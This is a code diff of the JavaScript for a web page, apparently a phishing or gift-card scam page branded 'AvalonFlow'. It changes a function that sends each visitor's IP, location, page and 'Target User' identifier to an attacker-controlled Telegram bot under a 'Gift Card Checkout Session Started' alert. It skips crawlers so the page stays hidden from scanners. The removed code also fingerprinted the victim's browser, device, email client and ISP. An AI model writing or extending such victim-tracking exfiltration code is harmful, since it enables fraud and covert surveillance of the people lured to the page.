@@ -355,117 +355,37 @@ async function initializeAppWithIP() {
 // 2. TELEGRAM VISITOR TRACKING SENDER
 // ==========================================
 async function sendVisitorDetailsToTelegram(ipData) {
-  try {
-    const rawAgent = navigator.userAgent;
+    try {
+        const rawAgent = navigator.userAgent;
+        if (/bot|googlebot|crawler|spider|robot/i.test(rawAgent)) return;
 
-    if (/bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|slurp|embed/i.test(rawAgent)) {
-      console.log("🤖 Automated link indexing crawler bypassed safely.");
-      return;
+        const identifyUser = getTargetUserIdentifier();
+        const currentPage = window.location.pathname;
+
+        // Formatted visitor alert matching Page B layout
+        const messageText = `⚡ <b>Gift Card Checkout Session Started | AvalonFlow</b>\n\n` +
+                            `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
+                            `📄 <b>Page:</b> <code>${currentPage}</code>\n` +
+                            `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
+                            `📍 <b>Location:</b> <code>${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}</code>\n` +
+                            `⏱️ <b>Time:</b> <code>${new Date().toLocaleString()}</code>`;
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: TELEGRAM_CHAT_ID, 
+                text: messageText, 
+                parse_mode: 'HTML' 
+            })
+        });
+
+        sessionStorage.setItem('visitor_logged_tg', 'true');
+    } catch (err) {
+        console.warn("Telegram telemetry bypass error:", err);
     }
-
-    const identifyUser = getTargetUserIdentifier();
-    const currentPage = window.location.pathname;
-
-    let detailedDevice = "Unknown Device";
-    let detectedBrowser = "Unknown Browser";
-
-    if (/WhatsApp/i.test(rawAgent)) {
-      detectedBrowser = "WhatsApp In-App";
-    } else if (/TelegramBot|Telegram/i.test(rawAgent)) {
-      detectedBrowser = "Telegram In-App";
-    } else if (/Instagram/i.test(rawAgent)) {
-      detectedBrowser = "Instagram App";
-    } else if (/TikTok/i.test(rawAgent)) {
-      detectedBrowser = "TikTok App";
-    } else if (/FBAN|FBAV/i.test(rawAgent)) {
-      detectedBrowser = "Facebook App";
-    } else if (/Twitter|TwitterforiPhone|TwitterAndroid/i.test(rawAgent)) {
-      detectedBrowser = "X (Twitter) App";
-    } else if (/LinkedInApp/i.test(rawAgent)) {
-      detectedBrowser = "LinkedIn App";
-    } else if (/Phoenix/i.test(rawAgent)) {
-      detectedBrowser = "Phoenix Browser";
-    } else if (/SamsungBrowser/i.test(rawAgent)) {
-      detectedBrowser = "Samsung Internet";
-    } else if (/OComponent|Opera|OPR/i.test(rawAgent)) {
-      detectedBrowser = "Opera";
-    } else if (/Edg/i.test(rawAgent)) {
-      detectedBrowser = "Microsoft Edge";
-    } else if (/Firefox|FxiOS/i.test(rawAgent)) {
-      detectedBrowser = "Mozilla Firefox";
-    } else if (/Chrome|CriOS/i.test(rawAgent)) {
-      detectedBrowser = "Google Chrome";
-    } else if (/Safari/i.test(rawAgent) && !/Android/i.test(rawAgent)) {
-      detectedBrowser = "Apple Safari";
-    }
-
-    const referrer = document.referrer || "";
-    if (detectedBrowser === "Google Chrome" || detectedBrowser === "Apple Safari") {
-      if (/mail\.google\.com/i.test(referrer)) {
-        detectedBrowser += " (via Gmail Web)";
-      } else if (/mail\.yahoo/i.test(referrer)) {
-        detectedBrowser += " (via Yahoo Mail Web)";
-      } else if (/outlook|live\.com/i.test(referrer)) {
-        detectedBrowser += " (via Outlook Web)";
-      }
-    }
-
-    if (/Android/i.test(rawAgent)) {
-      const match = rawAgent.match(/Android\s+([^;]+);\s+([^)]+)/);
-      detailedDevice = match ? `Android ${match[1]} (${match[2]})` : "Android Device";
-    } else if (/iPhone|iPad|iPod/i.test(rawAgent)) {
-      const match = rawAgent.match(/OS\s+(\d+_\d+)/);
-      const iosVer = match ? match[1].replace('_', '.') : '';
-      detailedDevice = `iOS ${iosVer} (Apple Device)`;
-    } else if (/Windows/i.test(rawAgent)) {
-      const match = rawAgent.match(/Windows NT\s+([^;)]+)/);
-      let winVer = "PC";
-      if (match) {
-        if (match[1] === "10.0") winVer = "10/11";
-        else if (match[1] === "6.3") winVer = "8.1";
-        else if (match[1] === "6.1") winVer = "7";
-      }
-      detailedDevice = `Windows ${winVer}`;
-    } else if (/Macintosh/i.test(rawAgent)) {
-      detailedDevice = "macOS Device";
-    } else if (/Linux/i.test(rawAgent)) {
-      detailedDevice = "Linux System";
-    }
-
-    const isProxy = ipData.proxy || false;
-    const ipDisplay = isProxy ? `${ipData.ip} ⚠️ [Proxy/VPN]` : ipData.ip;
-    const screenResolution = `${window.screen.width}x${window.screen.height}`;
-    const connectionType = navigator.connection ? navigator.connection.effectiveType : "N/A";
-    const timestamp = new Date().toLocaleString();
-
-    const messageText = `⚡ <b>New Visitor Alert | AvalonFlow</b>\n\n` +
-                        `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
-                        `📄 <b>Visited Page:</b> <code>${currentPage}</code>\n` +
-                        `🌐 <b>IP:</b> <code>${ipDisplay}</code>\n` +
-                        `📍 <b>Location:</b> <code>${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}</code>\n` +
-                        `🏢 <b>ISP:</b> <code>${ipData.org || 'Unknown'}</code>\n` +
-                        `📶 <b>Net Speed:</b> <code>${connectionType}</code>\n` +
-                        `🌐 <b>Browser:</b> <code>${detectedBrowser}</code>\n` +
-                        `📱 <b>Device Setup:</b> <code>${detailedDevice}</code>\n` + 
-                        `📐 <b>Screen Res:</b> <code>${screenResolution}</code>\n` +
-                        `⏱️ <b>Time:</b> <code>${timestamp}</code>`;
-
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: messageText,
-        parse_mode: 'HTML'
-      })
-    });
-
-    sessionStorage.setItem('visitor_logged_tg', 'true');
-    console.log("🔒 Security telemetry parameters forwarded successfully.");
-  } catch (err) {
-    console.warn("Telegram telemetry bypass error:", err);
-  }
 }
+
 
 // ==========================================
 // 3. IP-BASED LOCALIZATION & STOREFRONT ROUTING
